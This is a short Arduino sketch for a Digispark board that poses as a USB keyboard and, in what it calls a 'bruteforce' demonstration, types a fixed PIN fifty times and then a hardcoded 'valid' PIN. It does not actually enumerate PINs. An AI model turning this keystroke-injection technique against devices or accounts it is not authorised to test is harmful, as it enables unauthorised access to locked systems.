#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if emulating keyboard because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected.
  
  DigiKeyboard.delay(100); //Delay for host device to get ready 
  
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0); 

  //Actual bruteforce -

  for (int i = 0; i <50 ; i++){
  digitalWrite(1, HIGH);
  DigiKeyboard.print("123456"); 
  digitalWrite(1, LOW); 
  }
  
  //Hardcoded valid pin for demonstration purpose
  DigiKeyboard.print("000000");

 for(;;); // Stop device after attack
}
